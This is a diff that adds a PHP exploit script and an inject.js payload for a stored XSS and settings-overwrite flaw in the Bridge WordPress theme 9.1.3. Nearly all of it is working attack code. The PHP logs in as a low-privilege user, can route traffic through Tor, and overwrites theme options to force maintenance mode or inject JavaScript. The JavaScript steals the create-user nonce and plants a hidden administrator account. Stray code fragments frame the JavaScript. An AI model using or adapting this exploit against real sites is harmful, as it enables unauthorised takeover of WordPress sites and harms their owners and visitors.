@@ -1,0 +1,198 @@
+<?php
+/**
+ * Exploit Titie: Bridge - Creative Multi-Purpose WordPress Theme  Exploit
+ * Google Dork:
+ * Exploit Author: wp0Day.com <contact@wp0day.com>
+ * Vendor Homepage: http://bridge.qodeinteractive.com/
+ * Software Link: http://themeforest.net/item/bridge-creative-multipurpose-wordpress-theme/7315054
+ * Version: 9.1.3
+ * Tested on: Debian 8, PHP 5.6.17-3
+ * Type: Stored XSS, Ability to overwrite any theme settings.
+ * Time line: Found [23-Apr-2016], Vendor notified [23-Apr-2016], Vendor fixed: [Yes], [RD:1]
+ */
+
+
+require_once('curl.php');
+//OR
+//include('https://raw.githubusercontent.com/svyatov/CurlWrapper/master/CurlWrapper.php');
+$curl = new CurlWrapper();
+
+
+$options = getopt("t:m:u:p:f:c:",array('tor:'));
+print_r($options);
+$options = validateInput($options);
+
+if (!$options){
+    showHelp();
+}
+
+if ($options['tor'] === true)
+{
+    echo " ### USING TOR ###\n";
+    echo "Setting TOR Proxy...\n";
+    $curl->addOption(CURLOPT_PROXY,"http://127.0.0.1:9150/");
+    $curl->addOption(CURLOPT_PROXYTYPE,7);
+    echo "Checking IPv4 Address\n";
+    $curl->get('https://dynamicdns.park-your-domain.com/getip');
+    echo "Got IP : ".$curl->getResponse()."\n";
+    echo "Are you sure you want to do this?\nType 'wololo' to continue: ";
+    $answer = fgets(fopen ("php://stdin","r"));
+    if(trim($answer) != 'wololo'){
+        die("Aborting!\n");
+    }
+    echo "OK...\n";
+}
+
+
+function logIn(){
+    global $curl, $options;
+    file_put_contents('cookies.txt',"\n");
+    $curl->setCookieFile('cookies.txt');
+    $curl->get($options['t']);
+    $data = array('log'=>$options['u'], 'pwd'=>$options['p'], 'redirect_to'=>$options['t'], 'wp-submit'=>'Log In');
+    $curl->post($options['t'].'/wp-login.php', $data);
+    $status =  $curl->getTransferInfo('http_code');
+    if ($status !== 302){
+        echo "Login probably failed, aborting...\n";
+        echo "Login response saved to login.html.\n";
+        die();
+    }
+    file_put_contents('login.html',$curl->getResponse());
+
+
+}
+
+
+function exploit(){
+    global $curl, $options;
+
+    switch ($options['m']){
+        case 'm' :
+                //Maintanence mode
+                echo "Putting site in maintenece mode\n";
+                $data = array('action' => 'qodef_save_options', 'qode_maintenance_mode'=>'yes');
+                $curl->post($options['t'].'/wp-admin/admin-ajax.php', $data);
+                $resp = $curl->getResponse();
+                echo "Response: ".$resp."\n";
+            break;
+        case 'x' :
+                //XSS Mode, create extra admin
+                echo "Injecting inject.js \n";
+                $data = array('action' => 'qodef_save_options', 'custom_js'=>file_get_contents(dirname(__FILE__)."/inject.js"));
+                $curl->post($options['t'].'/wp-admin/admin-ajax.php', $data);
+                $resp = $curl->getResponse();
+                echo "Response: ".$resp."\n";
+
+            break;
+    }
+
+
+
+}
+
+
+
+logIn();
+exploit();
+
+
+function validateInput($options){
+
+    if ( !isset($options['t']) || !filter_var($options['t'], FILTER_VALIDATE_URL) ){
+        return false;
+    }
+    if ( !isset($options['u']) ){
+        return false;
+    }
+    if ( !isset($options['p']) ){
+        return false;
+    }
+    if (!preg_match('~/$~',$options['t'])){
+        $options['t'] = $options['t'].'/';
+    }
+    if (!isset($options['m']) || !in_array($options['m'], array('m','x') ) ){
+        return false;
+    }
+    $options['tor'] = isset($options['tor']);
+
+    return $options;
+}
+
+
+function showHelp(){
+    global $argv;
+    $help = <<<EOD
+
+    Bridge Theme Exploit, Stored XSS, Create Admin account.
+
+Usage: php $argv[0] -t [TARGET URL] --tor [USE TOR?] -u [USERNAME] -p [PASSWORD] -m [MODE]
+
+       *** You need to have a valid login (customer or subscriber will do) in order to use this "exploit" **
+
+       [TARGET_URL] http://localhost/wordpress/
+       [MODE] x - Permanent XSS DEMO, m - Maintenance Mode
+
+Examples:
+       php $argv[0] -t http://localhost/wordpress --tor=yes -u customer1 -p password -m x
+       php $argv[0] -t http://localhost/wordpress --tor=yes -u customer1 -p password -m m
+
+    Misc:
+           CURL Wrapper by Leonid Svyatov <leonid@svyatov.ru>
+           @link http://github.com/svyatov/CurlWrapper
+           @license http://www.opensource.org/licenses/mit-license.html MIT License
+
+EOD;
+    echo $help."\n\n";
+    die();
+}
+
+?>
+inject.js
+});
+
+//Get Token
+var domain = location.protocol+'//'+document.domain;
+var url = domain+'/wp-admin/user-new.php';
+var JQ = jQuery.noConflict();
+JQ.ajax({
+    "url": url,
+    "success" : function(x){
+        //Got the response
+        console.log('Got response');
+        var re = /name="_wpnonce_create-user"(\s+)value="([^"]+)"/g;
+        var m = re.exec(x);
+        if (m[2].match(/([a-z0-9]{10})/)) {
+            var nonce = m[2];
+            console.log('Got nonce '+nonce);
+        }
+        console.log('Registering, User: wp0day_poc, Pass: secret, Role: Admin ');
+        JQ.ajax({
+            "url": url,
+            "method" : "POST",
+            "data" :
+                    { "action":"createuser",
+                      "_wpnonce_create-user": nonce,
+                      "_wp_http_referer" : "/wp-admin/user-new.php",
+                      "user_login": "wp0day_poc",
+                      "email" : "contact@wp0day.com",
+                      "first_name" : "Exploit",
+                      "last_name" : "Poc",
+                      "url" : "http://wp0day.com/",
+                      "pass1" : "secret",
+                      "pass1-text" : "secret",
+                      "pass2" : "secret",
+                      "send_user_notification" : 0,
+                      "role":"administrator",
+                      "createuser" : "Add+New+User"
+                      },
+            "success" : function(x){
+                console.log("Register done");
+            }
+        });
+
+    }
+});
+
+
+
+$j(document).ready(function(){
